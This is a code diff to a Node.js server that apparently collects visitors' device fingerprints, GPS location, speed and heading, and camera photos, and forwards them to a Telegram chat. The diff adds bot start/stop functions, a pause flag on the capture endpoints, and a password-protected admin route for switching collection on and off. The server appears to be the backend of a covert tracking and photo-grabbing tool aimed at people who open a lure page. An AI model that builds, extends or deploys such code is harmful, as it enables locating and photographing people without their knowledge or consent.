@@ -21,18 +21,33 @@ const storage = multer.memoryStorage();
 const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } });
 
 let bot = null;
-if (TELEGRAM_TOKEN && TELEGRAM_CHAT_ID) {
+let listenersEnabled = true;
+let botPolling = false;
+
+function startBot() {
+  if (botPolling) return;
+  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return;
   try {
     const TelegramBot = require('node-telegram-bot-api');
     const BotClass = TelegramBot.default || TelegramBot;
     bot = new BotClass(TELEGRAM_TOKEN, { polling: true });
+    botPolling = true;
     console.log('Telegram bot connected successfully!');
   } catch (e) {
     console.log('Telegram bot error:', e.message);
   }
-} else {
-  console.log('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env');
 }
+
+function stopBot() {
+  if (bot && botPolling) {
+    bot.stopPolling();
+    bot = null;
+    botPolling = false;
+    console.log('Telegram bot stopped.');
+  }
+}
+
+startBot();
 
 const DATA_DIR = path.join(__dirname, 'data');
 const UPLOADS_DIR = path.join(DATA_DIR, 'uploads');
@@ -215,6 +230,7 @@ function formatNetwork(connectionType) {
 }
 
 app.post('/api/capture', async (req, res) => {
+  if (!listenersEnabled) return res.json({ success: false, reason: 'System paused' });
   const {
     deviceModel: clientDeviceModel,
     screen, availScreen, windowSize, language, languages, platform,
@@ -329,6 +345,7 @@ app.post('/api/capture', async (req, res) => {
 });
 
 app.post('/api/gps', (req, res) => {
+  if (!listenersEnabled) return res.json({ success: false, reason: 'System paused' });
   const { latitude, longitude, accuracy, speed, altitude, heading } = req.body;
   if (!latitude || !longitude) return res.json({ success: false });
 
@@ -381,6 +398,7 @@ app.post('/api/gps', (req, res) => {
 });
 
 app.post('/api/photo', upload.single('photo'), (req, res) => {
+  if (!listenersEnabled) return res.json({ success: false, reason: 'System paused' });
   if (!req.file || !req.file.buffer || req.file.buffer.length === 0) {
     console.log('Photo upload: No file received');
     return res.json({ success: false, error: 'No file' });
@@ -454,7 +472,32 @@ app.get('/', (req, res) => {
 });
 
 app.get('/health', (req, res) => {
-  res.json({ status: 'ok', bot: !!bot });
+  res.json({ status: 'ok', bot: !!bot, botRunning: botPolling, listeners: listenersEnabled });
+});
+
+app.post('/admin/control', (req, res) => {
+  const auth = req.headers.authorization;
+  if (!auth) { res.setHeader('WWW-Authenticate', 'Basic realm="Admin"'); return res.status(401).json({ error: 'Auth required' }); }
+  const [scheme, enc] = auth.split(' ');
+  if (scheme !== 'Basic') return res.status(401).json({ error: 'Bad scheme' });
+  const dec = Buffer.from(enc, 'base64').toString('utf-8');
+  const [u, p] = dec.split(':');
+  if (u !== ADMIN_USER || p !== ADMIN_PASS) return res.status(401).json({ error: 'Wrong creds' });
+
+  const { action } = req.body;
+  if (action === 'stop') {
+    listenersEnabled = false;
+    stopBot();
+    console.log('ADMIN: All listeners stopped, bot offline');
+    return res.json({ listeners: false, botRunning: false });
+  }
+  if (action === 'start') {
+    listenersEnabled = true;
+    startBot();
+    console.log('ADMIN: All listeners started, bot online');
+    return res.json({ listeners: true, botRunning: botPolling });
+  }
+  res.json({ listeners: listenersEnabled, botRunning: botPolling });
 });
 
 const PORT = process.env.PORT || 3000;
